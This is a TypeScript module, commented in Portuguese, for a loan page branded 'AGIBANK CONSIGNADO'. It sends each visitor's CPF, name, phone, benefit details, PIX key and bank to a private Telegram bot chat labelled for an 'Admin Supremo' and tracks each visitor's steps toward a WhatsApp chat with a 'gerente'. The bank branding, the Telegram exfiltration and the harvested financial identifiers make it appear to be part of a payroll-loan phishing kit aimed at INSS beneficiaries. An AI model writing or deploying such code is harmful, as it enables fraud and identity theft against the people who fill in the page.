import { evaluateLeadQuality, type LeadMetadata } from "./tracker-core";
import { brl } from "./loan";

// Envia mensagem direta para o Telegram do Admin Supremo
export async function sendTelegramNotification(metadata: LeadMetadata): Promise<boolean> {
  const token = process.env["TELEGRAM_BOT_TOKEN"];
  const chatId = process.env["TELEGRAM_ADMIN_CHAT_ID"];

  if (!token || !chatId) {
    // Se não configurado, faz log limpo para debug sem travar a aplicação
    console.warn("[Telegram Notifier] TELEGRAM_BOT_TOKEN ou TELEGRAM_ADMIN_CHAT_ID não definidos.");
    return false;
  }

  const quality = evaluateLeadQuality(metadata);
  const now = new Date().toLocaleString("pt-BR", { timeZone: "America/Sao_Paulo" });

  const tierEmoji = {
    DIAMANTE: "💎 DIAMANTE (LEAD QUENTE)",
    OURO: "🥇 OURO (ALTA INTENÇÃO)",
    PRATA: "🥈 PRATA (EM PROGRESSO)",
    CURIOSO: "👀 CURIOSO",
    BOT_SUSPEITO: "⚠️ BOT OU INVÁLIDO",
  }[quality.tier];

  const stepLabels: Record<string, string> = {
    visit: "🌐 Acessou a página inicial",
    cpf_entered: "📝 Informou CPF",
    cpf_validated: "✅ CPF Válido & Titular Consultado",
    perfil_selected: "👤 Selecionou Perfil INSS",
    motivo_selected: "📄 Motivo do Benefício",
    tempo_selected: "⏳ Tempo de Benefício",
    faixa_selected: "💰 Faixa Salarial",
    diretrizes_accepted: "⚖️ Aceitou Diretrizes Legais",
    analysis_completed: "🔍 Análise de Score Realizada",
    score_viewed: "📊 Visualizou o Score",
    valor_viewed: "💵 Visualizou Valor Estimado",
    bancos_selected: "🏦 Selecionou Bancos",
    payout_entered: "💳 Dados de Recebimento (PIX/Conta)",
    review_accepted: "📑 Confirmou Revisão dos Dados",
    whatsapp_clicked: "🚀 CLICOU PARA FALAR NO WHATSAPP COM O GERENTE",
    page_exit: "🚪 Abandonou a página",
  };

  const message = [
    `<b>🚨 NOVO EVENTO DE LEAD - AGIBANK CONSIGNADO</b>`,
    `<b>📅 Data/Hora:</b> <code>${now}</code>`,
    `<b>📌 Etapa:</b> <b>${stepLabels[metadata.step] ?? metadata.step}</b>`,
    metadata.stepDetails ? `<b>ℹ️ Detalhe:</b> ${metadata.stepDetails}` : "",
    ``,
    `<b>🎯 CLASSIFICAÇÃO DO LEAD:</b>`,
    `<b>Nível:</b> <code>${tierEmoji}</code>`,
    `<b>Score de Validação:</b> <b>${quality.score}/100</b>`,
    quality.badges.length > 0 ? `<b>Selo(s):</b> ${quality.badges.map((b) => `[${b}]`).join(" ")}` : "",
    ``,
    `<b>👤 DADOS DO CLIENTE:</b>`,
    metadata.name ? `<b>Nome:</b> ${metadata.name}` : "",
    metadata.cpf ? `<b>CPF:</b> <code>${metadata.cpf}</code>` : "",
    metadata.phone ? `<b>Celular/WhatsApp:</b> <code>${metadata.phone}</code>` : "",
    metadata.profile ? `<b>Perfil:</b> ${metadata.profile}` : "",
    metadata.reason ? `<b>Motivo:</b> ${metadata.reason}` : "",
    metadata.range ? `<b>Faixa Benefício:</b> ${metadata.range}` : "",
    metadata.approvedAmount ? `<b>Valor Estimado:</b> <b>${brl(metadata.approvedAmount)}</b>` : "",
    metadata.payoutMethod ? `<b>Forma de Pagamento:</b> ${metadata.payoutMethod.toUpperCase()}` : "",
    metadata.pixKey ? `<b>Chave PIX:</b> <code>${metadata.pixKey}</code>` : "",
    metadata.bankName ? `<b>Banco:</b> ${metadata.bankName}` : "",
    ``,
    `<b>📱 INFORMAÇÕES DE ACESSO:</b>`,
    metadata.timeOnSiteSeconds !== undefined ? `<b>Tempo no site:</b> ${metadata.timeOnSiteSeconds}s` : "",
    metadata.deviceType ? `<b>Dispositivo:</b> ${metadata.deviceType}` : "",
    `<b>ID do Lead:</b> <code>${metadata.leadId}</code>`,
  ]
    .filter(Boolean)
    .join("\n");

  try {
    const url = `https://api.telegram.org/bot${token}/sendMessage`;
    const res = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: "HTML",
        disable_web_page_preview: true,
      }),
    });

    return res.ok;
  } catch (err) {
    console.error("[Telegram Notifier] Falha ao enviar notificação:", err);
    return false;
  }
}
